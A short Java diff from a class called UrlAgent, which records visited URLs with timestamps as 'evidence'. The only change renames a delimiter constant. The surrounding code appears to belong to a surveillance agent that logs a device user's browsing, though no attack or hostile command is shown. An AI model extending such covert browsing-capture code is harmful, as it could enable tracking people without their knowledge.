@@ -198,7 +198,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         items.addElement(datetime.getStructTm());
         items.addElement(Utils.intToByteArray(version));
         items.addElement(WChar.getBytes(url, true));
-        items.addElement(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));
+        items.addElement(Utils.intToByteArray(Evidence.E_DELIMITER));
 
         evidence.createEvidence(null);
         evidence.writeEvidences(items);
